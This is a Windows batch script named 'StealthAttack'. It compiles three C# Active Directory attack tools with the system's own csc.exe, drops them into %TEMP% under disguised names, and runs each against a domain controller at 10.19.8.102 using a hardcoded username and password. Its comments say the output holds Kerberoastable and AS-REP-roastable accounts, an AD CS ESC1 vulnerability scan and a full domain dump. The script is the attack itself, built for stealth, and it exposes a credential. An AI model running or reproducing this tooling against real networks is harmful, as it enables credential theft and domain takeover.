@echo off
REM StealthAttack - matches StealthEnum.cs style (no third-party libs)
REM Compile with built-in csc.exe, output to %TEMP%
setlocal

set "CSC=C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"
if not exist "%CSC%" set "CSC=C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe"

if not exist "%CSC%" (
    echo ERROR: csc.exe not found.
    pause
    exit /b 1
)

echo.
echo === Compiling StealthKerb.cs ===
"%CSC%" /nologo /out:"%TEMP%\r.exe" /r:System.DirectoryServices.dll StealthKerb.cs

echo === Compiling StealthADCS.cs ===
"%CSC%" /nologo /out:"%TEMP%\c.exe" /r:System.DirectoryServices.dll StealthADCS.cs

echo === Compiling StealthSMB.cs ===
"%CSC%" /nologo /out:"%TEMP%\d.exe" /r:System.DirectoryServices.dll StealthSMB.cs

echo.
echo === Running StealthKerb ===
"%TEMP%\r.exe" lsg122b "EFveryFun08$" 10.19.8.102 > "%TEMP%\kerb.log" 2>&1
type "%TEMP%\kerb.log"

echo.
echo === Running StealthADCS ===
"%TEMP%\c.exe" lsg122b "EFveryFun08$" 10.19.8.102 > "%TEMP%\adcs.log" 2>&1
type "%TEMP%\adcs.log"

echo.
echo === Running StealthSMB ===
"%TEMP%\d.exe" lsg122b "EFveryFun08$" 10.19.8.102 > "%TEMP%\smb.log" 2>&1
type "%TEMP%\smb.log"

echo.
echo === DONE - all logs at %TEMP% ===
echo kerb.log = service accounts and AS-REP roastable users
echo adcs.log = AD CS vulnerability scan (ESC1 etc.)
echo smb.log  = domain dump (computers/users/groups/trusts)
echo.
pause
endlocal
